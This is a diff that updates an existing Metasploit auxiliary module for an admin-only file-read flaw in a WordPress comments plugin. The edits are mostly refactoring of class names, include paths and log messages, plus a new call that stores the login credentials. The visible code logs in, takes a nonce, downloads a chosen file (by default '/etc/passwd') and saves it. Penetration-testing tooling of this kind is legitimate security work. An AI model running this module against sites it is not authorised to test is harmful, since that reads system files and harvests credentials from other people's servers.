@@ -1,14 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
-  include Msf::HTTP::Wordpress
+  include Msf::Exploit::Remote::HTTP::Wordpress
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
@@ -22,7 +19,7 @@ class Metasploit3 < Msf::Auxiliary
       'References'     =>
         [
           ['WPVDB', '8102'],
-          ['URL', 'http://packetstormsecurity.com/files/132694/'],
+          ['PACKETSTORM', '132694'],
           ['URL', 'https://security.dxw.com/advisories/admin-only-local-file-inclusion-and-arbitrary-code-execution-in-subscribe-to-comments-2-1-2/']
         ],
       'Author'         =>
@@ -38,7 +35,7 @@ class Metasploit3 < Msf::Auxiliary
         OptString.new('WP_USER', [true, 'A valid username', nil]),
         OptString.new('WP_PASS', [true, 'Valid password for the provided username', nil]),
         OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd'])
-      ], self.class)
+      ])
   end
 
   def user
@@ -65,7 +62,7 @@ class Metasploit3 < Msf::Auxiliary
 
     if res && res.redirect? && res.redirection
       location = res.redirection
-      print_status("#{peer} - Following redirect to #{location}")
+      print_status("Following redirect to #{location}")
       res = send_request_cgi(
         'uri'    => location,
         'method' => 'GET',
@@ -116,25 +113,26 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run_host(ip)
-    vprint_status("#{peer} - Trying to login as: #{user}")
+    vprint_status("Trying to login as: #{user}")
     cookie = wordpress_login(user, password)
     if cookie.nil?
-      print_error("#{peer} - Unable to login as: #{user}")
+      print_error("Unable to login as: #{user}")
       return
     end
+    store_valid_credential(user: user, private: password, proof: cookie)
 
-    vprint_status("#{peer} - Trying to get nonce...")
+    vprint_status("Trying to get nonce...")
     nonce = get_nonce(cookie)
     if nonce.nil?
-      print_error("#{peer} - Can not get nonce after login")
+      print_error("Can not get nonce after login")
       return
     end
-    vprint_status("#{peer} - Got nonce: #{nonce}")
+    vprint_status("Got nonce: #{nonce}")
 
-    vprint_status("#{peer} - Trying to download filepath.")
+    vprint_status("Trying to download filepath.")
     file_path = down_file(cookie, nonce)
     if file_path.nil?
-      print_error("#{peer} - Error downloading filepath.")
+      print_error("Error downloading filepath.")
       return
     end
 
@@ -164,9 +162,9 @@ class Metasploit3 < Msf::Auxiliary
         fname
       )
 
-      print_good("#{peer} - File saved in: #{path}")
+      print_good("File saved in: #{path}")
     else
-      print_error("#{peer} - Nothing was downloaded. You can try to change the FILEPATH.")
+      print_error("Nothing was downloaded. You can try to change the FILEPATH.")
     end
   end
 end
